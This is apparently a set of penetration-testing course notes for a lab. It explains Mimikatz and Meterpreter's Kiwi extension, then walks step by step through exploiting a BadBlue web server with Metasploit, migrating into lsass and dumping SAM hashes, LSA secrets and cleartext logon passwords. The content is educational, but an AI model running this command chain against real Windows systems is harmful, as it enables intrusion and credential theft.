Mimikatz
- Mimikatz is a Windows post-exploitation tool written by Benjamin Delphy (@gentilkiwi). It allows for the extraction of the clear-text passwords, hashes, and Kerberos tickets from memory.
- The SAM (Security Account Manager) database, is a database file on Windows systems that stores hashed user passwords.
- Mimikatz can be used to extract hashes from the lsass.exe process memory where password hashes are cached.
- We can utilize the pre-compiled Mimikatz executable, alternatively, if we have access to a Meterpreter session on a Windows target, we can utilize the inbuilt Meterpreter extension Kiwi.
- Kiwi performs hash dumping within memory, so no malicious binary is uploaded to the target system, and everything is being executed in memory, this subsequently means that there are not as many artifacts left on the target system while using the Kiwi extension.
- Note: Mimikatz will require elevated privileges in order to run correctly, since the lsass.exe process is a privileged process, which runs with System privileges. In order to interact with it, you need Administrative privileges or System privileges.

Practical Demonstration
- `nmap -sV demo.ine.local`
- `service postgresql start; msfconsole`
- `search badblue`
- `use exploit/windows/http/badblue_passthru`
- `options`
- `set RHOSTS demo.ine.local`
- `exploit`
- Meterpreter Session:
	- `sysinfo`
	- `getuid`
	- `pgrep lsass`
	- `migrate 788`
	- `getuid`
	- `load kiwi`
		- `?`
		- `creds_all`
		- `lsa_dump_sam`
			- By executing the command above we get the NTLM hashes for the user accounts present on the system, along with the domain, the users' RIDs, and the SAM database's SysKey.
		- The RID value of 500 confirms that the user given is an Administrator user.
		- `lsa_dump_secrets`
			- By executing the command above, we might be able to retrieve cleartext credentials in some cases.
		- WDigest credentials can be dumped using the `creds_wdigest` command.
		- In case we are working within an Active Directory environment, we can use commands to interact with kerberos tickets as well.
		- The `password_change` command can be used to change the password of a user account.
	- Mimikatz
			- `cd C:\\`
			- `mkdir Temp`
			- `cd Temp`
			- `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
			- `shell`
				- `dir`
				- `.\mimikatz.exe`
					- `privilege::debug`
						- If the previous command provides us with an output of `Privilege '20' OK`, it means that we have the required privileges to perform the hash dump process.
					- `lsadump::sam`
						- By executing the command above we get the NTLM hashes for the user accounts present on the system, along with the domain, the users' RIDs, and the SAM database's SysKey.
						- The RID value of 500 confirms that the given user is an Administrator.
					- `lsadump::secrets`
						- By executing the command above, we might be able to retrieve cleartext credentials in some cases.
					- Using the Mimikatz executable, we can try to display logon passwords, logon passwords are cleartext passwords store on the Windows system in memory whenever a user logs onto windows, if the system is configured to store them.
						- `sekurlsa::logonpasswords`